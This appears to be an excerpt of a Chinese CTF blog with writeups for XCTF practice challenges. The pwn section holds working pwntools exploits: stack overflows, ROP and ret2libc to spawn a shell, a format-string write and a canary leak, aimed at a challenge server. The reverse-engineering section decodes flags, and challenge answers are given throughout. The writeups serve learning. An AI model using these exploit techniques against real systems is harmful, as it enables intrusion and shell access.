&amp; 0xFFFFFFFC) );  v3 = &amp;v0[v2];  if ( v1 &amp; 2 )  {    *(_WORD *)v3 = 0;    v3 += 2;  }  if ( v1 &amp; 1 )    *v3 = 0;  puts(&quot;please tell me your name&quot;);  fgets(name, 50, stdin);  puts(&quot;hello,you can leave some message here:&quot;);  return gets(&amp;s);}int pwn(){  return system(&quot;echo hehehe&quot;);}</code></pre><p>所有需要用到的函数都在这里，可以看到自带system函数，但是没有<code>/bin/sh</code>，所以需要手动构造，正好之前输入了一个<code>name</code>是一个全局变量，可以直接找到地址，以此构造ROP，exp如下：</p><pre><code class="python">from pwn import *sh_addr=0x0804A080elf=ELF(&#39;./cgpwn2&#39;)sys_addr=elf.symbols[&#39;system&#39;]io=process(&#39;./cgpwn2&#39;)io=remote(&#39;111.198.29.45&#39;,52898)io.sendlineafter(&#39;please tell me your name&#39;,&#39;/bin/sh&#39;)io.recvuntil(&#39;hello,you can leave some message here:&#39;)payload=&#39;a&#39;*0x26+p32(0)+p32(sys_addr)+p32(0)+p32(sh_addr)io.sendline(payload)io.interactive()</code></pre><h4 id="when-did-you-born"><a href="#when-did-you-born" class="headerlink" title="when_did_you_born"></a>when_did_you_born</h4><p>简单的栈溢出，经典题目，有膜法</p><pre><code class="python">from pwn import *# io=process(&#39;./when_did_you_born&#39;)io=remote(&#39;111.198.29.45&#39;,47087)io.sendlineafter(&#39;What\&#39;s Your Birth?&#39;,&#39;1000&#39;)io.recvuntil(&quot;What&#39;s Your Name?&quot;)payload=&#39;a&#39;*(0x20-0x18)+p64(1926)io.sendline(payload)io.interactive()</code></pre><h4 id="hello-pwn"><a href="#hello-pwn" class="headerlink" title="hello_pwn"></a>hello_pwn</h4><p>比上一题更简单的溢出（半斤八两）</p><pre><code class="python">from pwn import *# io=process(&#39;./hello_pwn&#39;)io=remote(&#39;111.198.29.45&#39;,42456)io.recvuntil(&#39;bof&#39;)payload=&#39;a&#39;*4+p64(1853186401)io.sendline(payload)io.interactive()</code></pre><h4 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h4><p>ret2libc，泄露一个函数地址然后算偏移，控制程序流程再执行一次漏洞函数，拿到shell</p><pre><code class="python">from pwn import *from LibcSearcher import *# io=process(&#39;./level3&#39;)io=remote(&#39;111.198.29.45&#39;,41019)elf=ELF(&#39;./level3&#39;)write_plt=elf.plt[&#39;write&#39;]vuln_addr = elf.symbols[&#39;vulnerable_function&#39;]write_got=elf.got[&#39;write&#39;]payload=&#39;a&#39;*0x88+p32(0)+p32(write_plt)+p32(vuln_addr)+p32(1)+p32(write_got)+p32(4)io.recvuntil(&#39;Input:\n&#39;)io.sendline(payload)write_leak=u32(io.recv()[:4])libc=LibcSearcher(&#39;write&#39;,write_leak)libc_base = write_leak - libc.dump(&#39;write&#39;)sys_addr=libc_base+libc.dump(&#39;system&#39;)bin_sh_addr=libc_base+libc.dump(&#39;str_bin_sh&#39;)io.recv()payload=&#39;a&#39;*0x88+p32(0)+p32(sys_addr)+p32(0)+p32(bin_sh_addr)io.sendline(payload)io.interactive()</code></pre><p>这里还有个问题没解决，在本地运行一直不行，但是在服务器端就可以拿到shell，暂时还不知道原因</p><h4 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h4><p>也是很简单的一道题，但不知道为什么gdb和远程都能过，就是本地直接运行一直报segmentation fault</p><pre><code class="python">from pwn import *sys_addr=0x400596pop_ret_addr=0x400663main_addr=0x4005c6 # io=process(&#39;./level0/level0&#39;)io=remote(&#39;111.198.29.45&#39;,47038)payload=&#39;a&#39;*(0x80+8)+p64(sys_addr)# print payloadio.recv()io.send(payload)io.interactive()</code></pre><h4 id="CGfsb"><a href="#CGfsb" class="headerlink" title="CGfsb"></a>CGfsb</h4><p>格式化字符串漏洞的利用</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp){  int buf; // [esp+1Eh] [ebp-7Eh]  int v5; // [esp+22h] [ebp-7Ah]  __int16 v6; // [esp+26h] [ebp-76h]  char s; // [esp+28h] [ebp-74h]  unsigned int v8; // [esp+8Ch] [ebp-10h]  v8 = __readgsdword(0x14u);  setbuf(stdin, 0);  setbuf(stdout, 0);  setbuf(stderr, 0);  buf = 0;  v5 = 0;  v6 = 0;  memset(&amp;s, 0, 0x64u);  puts(&quot;please tell me your name:&quot;);  read(0, &amp;buf, 0xAu);  puts(&quot;leave your message please:&quot;);  fgets(&amp;s, 100, stdin);  printf(&quot;hello %s&quot;, &amp;buf);  puts(&quot;your message is:&quot;);  printf(&amp;s);  if ( pwnme == 8 )  {    puts(&quot;you pwned me, here is your flag:\n&quot;);    system(&quot;cat flag&quot;);  }  else  {    puts(&quot;Thank you!&quot;);  }  return 0;}</code></pre><p>两次输入，第一次只能输入10个字符，不够我们构造<code>payload</code>，所以利用第二次输入的格式化字符串漏洞实现任意地址可写，修改<code>pwnme</code>的值，<code>exp</code>如下：</p><pre><code class="python">from pwn import *pwnme=0x0804A068payload=p32(pwnme)+&#39;a&#39;*4+&#39;%10$n&#39;# io=process(&#39;./CGfsb&#39;)io=remote(&#39;111.198.29.45&#39;,37888)io.sendlineafter(&#39;name:&#39;,&#39;a&#39;)io.recvuntil(&#39;please:&#39;)io.sendline(payload)io.interactive()</code></pre><p>很简单，直接输出flag</p><pre><code>cyberpeace{428fd5c839a04a6d162bdd6610a094cf}</code></pre><h4 id="forgot"><a href="#forgot" class="headerlink" title="forgot"></a>forgot</h4><p>这道题简单的溢出就可以解决了</p><pre><code class="c++">int __cdecl main(){  size_t v0; // ebx  char v2[32]; // [esp+10h] [ebp-74h]  int (*v3)(); // [esp+30h] [ebp-54h]  int (*v4)(); // [esp+34h] [ebp-50h]  int (*v5)(); // [esp+38h] [ebp-4Ch]  int (*v6)(); // [esp+3Ch] [ebp-48h]  int (*v7)(); // [esp+40h] [ebp-44h]  int (*v8)(); // [esp+44h] [ebp-40h]  int (*v9)(); // [esp+48h] [ebp-3Ch]  int (*v10)(); // [esp+4Ch] [ebp-38h]  int (*v11)(); // [esp+50h] [ebp-34h]  int (*v12)(); // [esp+54h] [ebp-30h]  char s; // [esp+58h] [ebp-2Ch]  int v14; // [esp+78h] [ebp-Ch]  size_t i; // [esp+7Ch] [ebp-8h]  v14 = 1;  v3 = sub_8048604;  v4 = sub_8048618;  v5 = sub_804862C;  v6 = sub_8048640;  v7 = sub_8048654;  v8 = sub_8048668;  v9 = sub_804867C;  v10 = sub_8048690;  v11 = sub_80486A4;  v12 = sub_80486B8;  puts(&quot;What is your name?&quot;);  printf(&quot;&gt; &quot;);  fflush(stdout);  fgets(&amp;s, 32, stdin);  sub_80485DD((int)&amp;s);  fflush(stdout);  printf(&quot;I should give you a pointer perhaps. Here: %x\n\n&quot;, sub_8048654);  fflush(stdout);  puts(&quot;Enter the string to be validate&quot;);  printf(&quot;&gt; &quot;);  fflush(stdout);  __isoc99_scanf(&quot;%s&quot;, v2);  for ( i = 0; ; ++i )  {    v0 = i;    if ( v0 &gt;= strlen(v2) )      break;    switch ( v14 )    {      case 1:        if ( sub_8048702(v2[i]) )          v14 = 2;        break;      case 2:        if ( v2[i] == 64 )          v14 = 3;        break;      case 3:        if ( sub_804874C(v2[i]) )          v14 = 4;        break;      case 4:        if ( v2[i] == 46 )          v14 = 5;        break;      case 5:        if ( sub_8048784(v2[i]) )          v14 = 6;        break;      case 6:        if ( sub_8048784(v2[i]) )          v14 = 7;        break;      case 7:        if ( sub_8048784(v2[i]) )          v14 = 8;        break;      case 8:        if ( sub_8048784(v2[i]) )          v14 = 9;        break;      case 9:        v14 = 10;        break;      default:        continue;    }  }  (*(&amp;v3 + --v14))();  return fflush(stdout);}</code></pre><p>有两个输入的地方，第一个地方严格控制了输入的字符数，所以没什么用，第二个用了<code>scanf</code>，可以无限制的输入，利用这个地方来控制我们的程序。</p><p>这个程序开了<code>NX</code>，所以找找有没有可以利用的函数，找到</p><pre><code class="c++">int sub_80486CC(){  char s; // [esp+1Eh] [ebp-3Ah]  snprintf(&amp;s, 0x32u, &quot;cat %s&quot;, &quot;./flag&quot;);  return system(&amp;s);}</code></pre><p>接下来考虑怎么利用。程序最后会根据<code>v14</code>的值来判断该执行那个函数，看到有些人想要覆盖<code>v14</code>的值，我的做法就是保留<code>v14=1</code>然后去替换<code>v3</code>的值，因为即使替换掉<code>v14</code>，后面也会被修改。</p><p>下一步就是要控制<code>v14</code>的值不变，我的做法是在写入的时候先写入一个<code>&#39;\0&#39;</code>，这样判断字符串长度的时候为0，直接跳出循环。<code>exp</code>如下：</p><pre><code class="python">from pwn import *# io=process(&#39;./forgot&#39;)io=remote(&#39;111.198.29.45&#39;,40669)io.recvuntil(&#39;&gt;&#39;)io.sendline(&#39;a&#39;)payload=&#39;\0&#39;+&#39;A&#39;*0x1f+p32(0x80486cc)io.recvuntil(&#39;&gt;&#39;)io.sendline(payload)io.interactive()</code></pre><p>得到flag</p><pre><code>cyberpeace{3a2c567e832c79478c593e5f6f334830}</code></pre><h4 id="Mary-Morton"><a href="#Mary-Morton" class="headerlink" title="Mary_Morton"></a>Mary_Morton</h4><p>题目里面一共有两个漏洞，并且都标明出来了，不需要自己去找</p><pre><code class="c++">void __fastcall __noreturn main(__int64 a1, char **a2, char **a3){  int v3; // [rsp+24h] [rbp-Ch]  unsigned __int64 v4; // [rsp+28h] [rbp-8h]  v4 = __readfsqword(0x28u);  sub_4009FF();  puts(&quot;Welcome to the battle ! &quot;);  puts(&quot;[Great Fairy] level pwned &quot;);  puts(&quot;Select your weapon &quot;);  while ( 1 )  {    while ( 1 )    {      sub_4009DA();      __isoc99_scanf(&quot;%d&quot;, &amp;v3);      if ( v3 != 2 )        break;      sub_4008EB();    }    if ( v3 == 3 )    {      puts(&quot;Bye &quot;);      exit(0);    }    if ( v3 == 1 )      sub_400960();    else      puts(&quot;Wrong!&quot;);  }}int sub_4009DA(){  puts(&quot;1. Stack Bufferoverflow Bug &quot;);  puts(&quot;2. Format String Bug &quot;);  return puts(&quot;3. Exit the battle &quot;);}</code></pre><p>选择2的话会进入一个包含格式化字符串漏洞的函数，选择1会进入一个有栈溢出漏洞的函数</p><pre><code class="c++">//格式化字符串unsigned __int64 sub_4008EB(){  char buf; // [rsp+0h] [rbp-90h]  unsigned __int64 v2; // [rsp+88h] [rbp-8h]  v2 = __readfsqword(0x28u);  memset(&amp;buf, 0, 0x80uLL);  read(0, &amp;buf, 0x7FuLL);  printf(&amp;buf, &amp;buf);  return __readfsqword(0x28u) ^ v2;}//栈溢出unsigned __int64 sub_400960(){  char buf; // [rsp+0h] [rbp-90h]  unsigned __int64 v2; // [rsp+88h] [rbp-8h]  v2 = __readfsqword(0x28u);  memset(&amp;buf, 0, 0x80uLL);  read(0, &amp;buf, 0x100uLL);  printf(&quot;-&gt; %s\n&quot;, &amp;buf);  return __readfsqword(0x28u) ^ v2;}//目标函数int sub_4008DA(){  return system(&quot;/bin/cat ./flag&quot;);}</code></pre><p>如果<code>checksec</code>或者直接看到<code>v2</code>就可以发现，这个程序开了<code>cannary</code>保护，所以直接溢出是不行的，这时候可以考虑利用格式化字符串漏洞泄露<code>cannary</code>的值，因为进程没有中止就进入了下一个循环，所以<code>cannary</code>的值是不变的，这个时候选择利用栈溢出漏洞，覆盖返回地址为目标函数即可。这里虽然是64位，但是调用的函数没有参数，没必要构造很复杂的ROP链来控制程序执行流程。</p><p><code>exp</code>如下：</p><pre><code class="python">from pwn import *sys_addr=0x4008da# io=process(&#39;./Mary_Morton&#39;)io=remote(&#39;111.198.29.45&#39;,39178)io.recvuntil(&quot;3. Exit the battle \n&quot;)io.sendline(&quot;2&quot;)io.sendline(&quot;%23$p&quot;)cannary= int(io.recvline().strip(&#39;\n&#39;),16)print cannaryio.recvuntil(&quot;3. Exit the battle \n&quot;)io.sendline(&quot;1&quot;)payload=&quot;&quot;payload+=&#39;a&#39;*0x88payload+=p64(cannary)payload+=p64(0)payload+=p64(sys_addr)io.sendline(payload)io.interactive()</code></pre><p>得到flag</p><pre><code>cyberpeace{8b06a4becaf5e73cd79ea7d283d0bd89}</code></pre>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>攻防世界</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界-re部分题解（四）</title>
    <link href="/2020/02/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3%EF%BC%88%E5%9B%9B%EF%BC%89/"/>
    <url>/2020/02/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3%EF%BC%88%E5%9B%9B%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>最近比较忙，而且题目越做越快，平时的练习除非特别值得注意的，都不会写的太详细了</p><a id="more"></a><h4 id="serial-150"><a href="#serial-150" class="headerlink" title="serial-150"></a>serial-150</h4><p>这题本身的算法没什么难度，主要就是花指令的去除，去除之后就只是简单的字符串比较了，很容易。</p><pre><code>EZ9dmq4c8g9G7bAV</code></pre><h4 id="testre"><a href="#testre" class="headerlink" title="testre"></a>testre</h4><p>主要就是一个base58，很好做，尝试了一下ghidra的效果发现不尽如人意，所以主要还是采用IDA做题。</p><pre><code>flag{base58_is_boring}</code></pre><h4 id="simple-check-100"><a href="#simple-check-100" class="headerlink" title="simple-check-100"></a>simple-check-100</h4><p>这题没什么好写的，虽然前面的check函数进行了检测，但是后面的计算和前面的输入没什么关系，并且直接把flag给输出了，所以直接gdb调试改了<code>eax</code>的值直接输出flag就好了</p><pre><code>flag_is_you_know_cracking!!!</code></pre><h4 id="secret-string-400"><a href="#secret-string-400" class="headerlink" title="secret-string-400"></a>secret-string-400</h4><p>一直不知道这是什么，后来发现这竟然是个压缩包，里面有个网页和调用的js，js里面可以看到把机器码转成了命令然后执行，所以在执行之前输出一下</p><pre><code>console.log(command);</code></pre><p>在console里找到了关键判断</p><pre><code>var f=window.machine.registers[1].userinputvar i = f.lengthvar nonce = &#39;groke&#39;;var j = 0;var out = [];var eq = true;while(j &lt; i){    out.push(f.charCodeAt(j) ^ nonce.charCodeAt(j%5))    j++;}var ex =  [1, 30, 14, 12, 69, 14, 1, 85, 75, 50, 40, 37, 48, 24, 10, 56, 55, 46, 56, 60];if (ex.length == out.length) {    j = 0;    while(j &lt; ex.length){        if(ex[j] != out[j])        eq = false;        j += 1;    }if(eq){    alert(&#39;YOU WIN!&#39;);}else{    alert(&#39;NOPE!&#39;);}}else{alert(&#39;NOPE!&#39;);}</code></pre><p>过程非常简单，也是闲着无聊，写了个什么都没有的网页</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;decode&lt;/title&gt;    &lt;script type=&#39;text/javascript&#39; src=&#39;out.js&#39;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;    &lt;br/&gt;    &lt;input type=&#39;button&#39; onclick=&quot;run()&quot; value=&#39;decode&#39;&gt;&lt;/button&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><pre><code class="javascript">function run() {    const nonce = &#39;groke&#39;;    let j = 0;    let flag =&#39;&#39;;    const ex = [1, 30, 14, 12, 69, 14, 1, 85, 75, 50, 40, 37, 48, 24, 10, 56, 55, 46, 56, 60];    let i = ex.length;    while (j &lt; i) {        flag+=String.fromCharCode(ex[j] ^ nonce.charCodeAt(j % 5));        j++;    }    alert(flag);}</code></pre><p>点击按钮获得flag</p><pre><code>flag is: WOW_so_EASY</code></pre><h4 id="windows-reverse2"><a href="#windows-reverse2" class="headerlink" title="windows_reverse2"></a>windows_reverse2</h4><p>首先是脱壳，看雪脱壳工具就可以，也可以手动脱壳，IDA研究之后发现中间一个函数的作用不是很明朗，OD调试一下根据结果猜测可能是16进制转base64，试了一下就对了。</p><pre><code>ADEBDEAEC7BE</code></pre><h4 id="Newbie-calculations"><a href="#Newbie-calculations" class="headerlink" title="Newbie_calculations"></a>Newbie_calculations</h4><p>这题的就是直接会输出flag，但是进行了大量费事而且毫无意义的计算，需要仔细分析一下每一部分的函数作用，简化计算的过程，总共只有三个运算函数，很简单，就不一一分析了，直接计算flag：</p><pre><code class="c++">#include&lt;iostream&gt;using namespace std;int* sub(int *a, int b) {     *a -= b;     return a;}int* add(int *a, int b) {    *a += b;    return a;}int* mul(int *a, int b) {    *a *= b;    return a;}int __cdecl main(int argc, const char **argv, const char **envp) {    int *v3; // eax    int *v4; // eax    int *v5; // eax    int *v6; // eax    int *v7; // eax    int *v8; // eax    int *v9; // eax    int *v10; // eax    int *v11; // eax    int *v12; // eax    int *v13; // eax    int *v14; // eax    int *v15; // eax    int *v16; // eax    int *v17; // eax    int *v18; // eax    int *v19; // eax    int *v20; // eax    int *v21; // eax    int *v22; // eax    int *v23; // eax    int *v24; // eax    int *v25; // eax    int *v26; // eax    int *v27; // eax    int *v28; // eax    int *v29; // eax    int *v30; // eax    int *v31; // eax    int *v32; // eax    int *v33; // eax    int *v34; // eax    int *v35; // eax    int *v36; // eax    int *v37; // eax    int *v38; // eax    int *v39; // eax    int *v40; // eax    int *v41; // eax    int *v42; // eax    int *v43; // eax    int *v44; // eax    int *v45; // eax    int *v46; // eax    int *v47; // eax    int *v48; // eax    int *v49; // eax    int *v50; // eax    int *v51; // eax    int *v52; // eax    int *v53; // eax    int *v54; // eax    int *v55; // eax    int *v56; // eax    int *v57; // eax    int *v58; // eax    int *v59; // eax    int *v60; // eax    int *v61; // eax    int *v62; // eax    int *v63; // eax    int *v64; // eax    int *v65; // eax    int *v66; // eax    int *v67; // eax    int *v68; // eax    int *v69; // eax    int *v70; // eax    int *v71; // eax    int *v72; // eax    int *v73; // eax    int *v74; // eax    int *v75; // eax    int *v76; // eax    int *v77; // eax    int *v78; // eax    int *v79; // eax    int *v80; // eax    int *v81; // eax    int *v82; // eax    int *v83; // eax    int *v84; // eax    int *v85; // eax    int *v86; // eax    int *v87; // eax    int *v88; // eax    int *v89; // eax    int *v90; // eax    int *v91; // eax    int *v92; // eax    int *v93; // eax    int *v94; // eax    int *v95; // eax    int *v96; // eax    int *v97; // eax    int *v98; // eax    int *v99; // eax    int *v100; // eax    int *v101; // eax    int *v102; // eax    int *v103; // eax    int *v104; // eax    int *v105; // eax    int *v106; // eax    int *v107; // eax    int *v108; // eax    int v109; // ST1C_4    int *v110; // eax    int *v111; // eax    int v112; // ST20_4    int *v113; // eax    int *v114; // eax    int v115; // ST20_4    int *v116; // eax    int flag[32]; // [esp+Ch] [ebp-88h]    int v121; // [esp+8Ch] [ebp-8h]    for (int i = 0; i &lt; 32; ++i )        flag[i] = 1;    v121 = 0;    puts(&quot;Your flag is:&quot;);    v3 = mul(flag, 1000000000);    v4 = sub(v3, 999999950);    mul(v4, 2);    v5 = add(&amp;flag[1], 5000000);    v6 = sub(v5, 6666666);    v7 = add(v6, 1666666);    v8 = add(v7, 45);    v9 = mul(v8, 2);    add(v9, 5);    v10 = mul(&amp;flag[2], 1000000000);    v11 = sub(v10, 999999950);    v12 = mul(v11, 2);    add(v12, 2);    v13 = add(&amp;flag[3], 55);    v14 = sub(v13, 3);    v15 = add(v14, 4);    sub(v15, 1);    v16 = mul(&amp;flag[4], 100000000);    v17 = sub(v16, 99999950);    v18 = mul(v17, 2);    add(v18, 2);    v19 = sub(&amp;flag[5], 1);    v20 = mul(v19, 1000000000);    v21 = add(v20, 55);    sub(v21, 3);    v22 = mul(&amp;flag[6], 1000000);    v23 = sub(v22, 999975);    mul(v23, 4);    v24 = add(&amp;flag[7], 55);    v25 = sub(v24, 33);    v26 = add(v25, 44);    sub(v26, 11);    v27 = mul(&amp;flag[8], 10);    v28 = sub(v27, 5);    v29 = mul(v28, 8);    add(v29, 9);    v30 = add(&amp;flag[9], 0);    v31 = sub(v30, 0);    v32 = add(v31, 11);    v33 = sub(v32, 11);    add(v33, 53);    v34 = add(&amp;flag[10], 49);    v35 = sub(v34, 2);    v36 = add(v35, 4);    sub(v36, 2);    v37 = mul(&amp;flag[11], 1000000);    v38 = sub(v37, 999999);    v39 = mul(v38, 4);    add(v39, 50);    v40 = add(&amp;flag[12], 1);    v41 = add(v40, 1);    v42 = add(v41, 1);    v43 = add(v42, 1);    v44 = add(v43, 1);    v45 = add(v44, 1);    v46 = add(v45, 10);    add(v46, 32);    v47 = mul(&amp;flag[13], 10);    v48 = sub(v47, 5);    v49 = mul(v48, 8);    v50 = add(v49, 9);    add(v50, 48);    v51 = sub(&amp;flag[14], 1);    v52 = mul(v51, -294967296);    v53 = add(v52, 55);    sub(v53, 3);    v54 = add(&amp;flag[15], 1);    v55 = add(v54, 2);    v56 = add(v55, 3);    v57 = add(v56, 4);    v58 = add(v57, 5);    v59 = add(v58, 6);    v60 = add(v59, 7);    add(v60, 20);    v61 = mul(&amp;flag[16], 10);    v62 = sub(v61, 5);    v63 = mul(v62, 8);    v64 = add(v63, 9);    add(v64, 48);    v65 = add(&amp;flag[17], 7);    v66 = add(v65, 6);    v67 = add(v66, 5);    v68 = add(v67, 4);    v69 = add(v68, 3);    v70 = add(v69, 2);    v71 = add(v70, 1);    add(v71, 20);    v72 = add(&amp;flag[18], 7);    v73 = add(v72, 2);    v74 = add(v73, 4);    v75 = add(v74, 3);    v76 = add(v75, 6);    v77 = add(v76, 5);    v78 = add(v77, 1);    add(v78, 20);    v79 = mul(&amp;flag[19], 1000000);    v80 = sub(v79, 999999);    v81 = mul(v80, 4);    v82 = add(v81, 50);    sub(v82, 1);    v83 = sub(&amp;flag[20], 1);    v84 = mul(v83, -294967296);    v85 = add(v84, 49);    sub(v85, 1);    v86 = sub(&amp;flag[21], 1);    v87 = mul(v86, 1000000000);    v88 = add(v87, 54);    v89 = sub(v88, 1);    v90 = add(v89, 1000000000);    sub(v90, 1000000000);    v91 = add(&amp;flag[22], 49);    v92 = sub(v91, 1);    v93 = add(v92, 2);    sub(v93, 1);    v94 = mul(&amp;flag[23], 10);    v95 = sub(v94, 5);    v96 = mul(v95, 8);    v97 = add(v96, 9);    add(v97, 48);    v98 = add(&amp;flag[24], 1);    v99 = add(v98, 3);    v100 = add(v99, 3);    v101 = add(v100, 3);    v102 = add(v101, 6);    v103 = add(v102, 6);    v104 = add(v103, 6);    add(v104, 20);    v105 = add(&amp;flag[25], 55);    v106 = sub(v105, 33);    v107 = add(v106, 44);    v108 = sub(v107, 11);    add(v108, 42);    add(&amp;flag[26], flag[25]);    add(&amp;flag[27], flag[12]);    v109 = flag[27];    v110 = sub(&amp;flag[28], 1);    v111 = add(v110, v109);    sub(v111, 1);    v112 = flag[23];    v113 = sub(&amp;flag[29], 1);    v114 = mul(v113, 1000000);    add(v114, v112);    v115 = flag[27];    v116 = add(&amp;flag[30], 1);    mul(v116, v115);    add(&amp;flag[31], flag[30]);    printf(&quot;CTF{&quot;);    for (int j = 0; j &lt; 32; ++j)        printf(&quot;%c&quot;, char(flag[j]));    puts(&quot;}&quot;);    return 0;}</code></pre><p>直接输出flag</p><pre><code class="c++">Your flag is:CTF{daf8f4d816261a41a115052a1bc21ade}</code></pre><h4 id="easyre-153"><a href="#easyre-153" class="headerlink" title="easyre-153"></a>easyre-153</h4><p>先查壳，发现是upx，脱壳</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp){  int pipedes[2]; // [esp+18h] [ebp-38h]  __pid_t v5; // [esp+20h] [ebp-30h]  int v6; // [esp+24h] [ebp-2Ch]  char buf; // [esp+2Eh] [ebp-22h]  unsigned int v8; // [esp+4Ch] [ebp-4h]  v8 = __readgsdword(0x14u);  pipe(pipedes);  v5 = fork();  if ( !v5 )  {    puts(&quot;\nOMG!!!! I forgot kid&#39;s id&quot;);    write(pipedes[1], &quot;69800876143568214356928753&quot;, 29u);    puts(&quot;Ready to exit     &quot;);    exit(0);  }  read(pipedes[0], &amp;buf, 29u);  __isoc99_scanf(&quot;%d&quot;, &amp;v6);  if ( v6 == v5 )  {    if ( (*(_DWORD *)((_BYTE *)lol + 3) &amp; 0xFF) == 204 )    {      puts(&quot;:D&quot;);      exit(1);    }    printf(&quot;\nYou got the key\n &quot;);    lol(&amp;buf);  }  wait(0);  return 0;}</code></pre><p>发现用到了简单的子进程和pipe。</p><p>pipe的作用就和名字一样，建立一个管道，这个管道一端是读，一端是写，按照规定，<code>pipe[0]</code>是读，<code>pipe[1]</code>是写，然后fork了一个子进程，在子进程中，返回值为0，进入if分支通过管道写入了一个字符串，然后退出子进程。在父进程中，返回的是fork出来的子进程的id，跳过if分支，在下面读取了刚刚子进程写入的字符串，关键就是lol这个函数</p><pre><code class="c++">int __cdecl lol(_BYTE *a1){  char v2; // [esp+15h] [ebp-13h]  char v3; // [esp+16h] [ebp-12h]  char v4; // [esp+17h] [ebp-11h]  char v5; // [esp+18h] [ebp-10h]  char v6; // [esp+19h] [ebp-Fh]  char v7; // [esp+1Ah] [ebp-Eh]  char v8; // [esp+1Bh] [ebp-Dh]  v2 = 2 * a1[1];  v3 = a1[4] + a1[5];  v4 = a1[8] + a1[9];  v5 = 2 * a1[12];  v6 = a1[18] + a1[17];  v7 = a1[10] + a1[21];  v8 = a1[9] + a1[25];  return printf(&quot;flag_is_not_here&quot;);}</code></pre><p>这里的处理过程非常简单，还是正向的处理，但是最后输出的是一个没用的字符串，所以即使是输入子进程的pid，也不会输出真正的flag，所以还是自己动手算出来</p><pre><code class="python">a1 = &quot;69800876143568214356928753&quot;v2 = 2 * ord(a1[1])v3 = ord(a1[4]) + ord(a1[5])v4 = ord(a1[8]) + ord(a1[9])v5 = 2 * ord(a1[12])v6 = ord(a1[18]) + ord(a1[17])v7 = ord(a1[10]) + ord(a1[21])v8 = ord(a1[9]) + ord(a1[25])print(chr(v2)+chr(v3)+chr(v4)+chr(v5)+chr(v6)+chr(v7)+chr(v8))</code></pre><p>输出结果</p><pre><code>rhelheg</code></pre><p>直接提交不对，要套上外面的格式，试了一下比赛的名称，通过。</p><h4 id="asong"><a href="#asong" class="headerlink" title="asong"></a>asong</h4><p>这题还是很考验对于算法的逆向能力的</p><p>首先IDA打开</p><pre><code class="c++">__int64 __fastcall main(__int64 a1, char **a2, char **a3){  void *that_girl; // ST00_8  const char *flag; // ST08_8  that_girl = malloc(0xBCuLL);  flag = (const char *)malloc(80uLL);  sub_400BBF();  read_0((__int64)flag);  sub_400C02((__int64)flag);                   // 输入的是QCTF{***}的格式，在这里取出中间的部分  readfile(&quot;that_girl&quot;, (__int64)that_girl);  sub_400E54(flag, (__int64)that_girl);  return 0LL;}</code></pre><p>程序流程是这样，先输入flag，然后验证格式，取中间部分，然后读取另一个文件中的内容进行一些处理，然后将输入的flag和读取出来的内容进行一个比较，输出到out里面，重点来看一下几个函数</p><pre><code class="c++">int __fastcall readfile(const char *a1, __int64 a2){  int v2; // eax  __int64 v4; // [rsp+0h] [rbp-20h]  char buf; // [rsp+13h] [rbp-Dh]  int fd; // [rsp+14h] [rbp-Ch]  unsigned __int64 v7; // [rsp+18h] [rbp-8h]  v7 = __readfsqword(0x28u);  fd = open(a1, 0, a2, a1);  while ( read(fd, &amp;buf, 1uLL) == 1 )  {    v2 = sub_400936(buf);    ++*(_DWORD *)(4LL * v2 + v4);  }  return close(fd);}</code></pre><p>这里明显看到进行了一个词频统计，但是看这个伪代码完全看不出来处理之后的v4和分配出来的a2有什么关联，这点在C伪代码里面不是很明显，但是在汇编里面可以看的很清楚</p><pre><code class="asm">call    sub_400936cdqelea     rdx, ds:0[rax*4]mov     rax, [rbp+var_20]add     rax, rdxmov     edx, [rax]add     edx, 1mov     [rax], edx</code></pre><p>这里其实很清楚，<code>sub_400936</code>就是我们用来处理的函数，它的返回值放到了<code>rax</code>，<code>cdqe</code>的拓展在这里可以不用考虑，差不多算是个类型转换，<code>ds:0</code>是之前分配的空间，把<code>ds:0[rax*4]</code>的地址复制进<code>rdx</code>，后面的一句并没有什么意义，将这个地址中的值赋给<code>rax</code>，就是0，<code>add</code>之后rax的值就是我们需要的地址，接下来把该地址内存的的值取出来，加一然后再放回去，这个操作逻辑很容易理解。</p><p>这个函数过后构建了一个词频表，然后进行关键的变换。</p><pre><code class="c++">unsigned __int64 __fastcall sub_400E54(const char *flag, __int64 that_girl){  int i; // [rsp+18h] [rbp-48h]  int v4; // [rsp+1Ch] [rbp-44h]  char v5[56]; // [rsp+20h] [rbp-40h]  unsigned __int64 v6; // [rsp+58h] [rbp-8h]  v6 = __readfsqword(0x28u);  v4 = strlen(flag);  for ( i = 0; i &lt; v4; ++i )    v5[i] = *(_DWORD *)(4LL * (signed int)sub_400936(flag[i]) + that_girl);  sub_400D33((unsigned __int8 *)v5);  sub_400DB4(v5, v4);  writefile((__int64)v5, &quot;out&quot;, v4);  return __readfsqword(0x28u) ^ v6;}</code></pre><p>首先就是一个换表，然后就是两个函数的操作之后输出到了<code>out</code>文件里面，这个是我们已知的，再去看看两个关键函数</p><pre><code class="c++">__int64 __fastcall sub_400D33(unsigned __int8 *a1){  __int64 result; // rax  _BYTE v2[5]; // [rsp+13h] [rbp-5h]  v2[4] = 0;  *(_DWORD *)v2 = *a1;  while ( dword_6020A0[*(signed int *)&amp;v2[1]] )  {    a1[*(signed int *)&amp;v2[1]] = a1[dword_6020A0[*(signed int *)&amp;v2[1]]];    *(_DWORD *)&amp;v2[1] = dword_6020A0[*(signed int *)&amp;v2[1]];  }  result = v2[0];  a1[*(signed int *)&amp;v2[1]] = v2[0];  return result;}</code></pre><p>这是一个简单的次序上的调整，可以很快的逆出来</p><pre><code class="c++">_BYTE *__fastcall sub_400DB4(_BYTE *a1, int 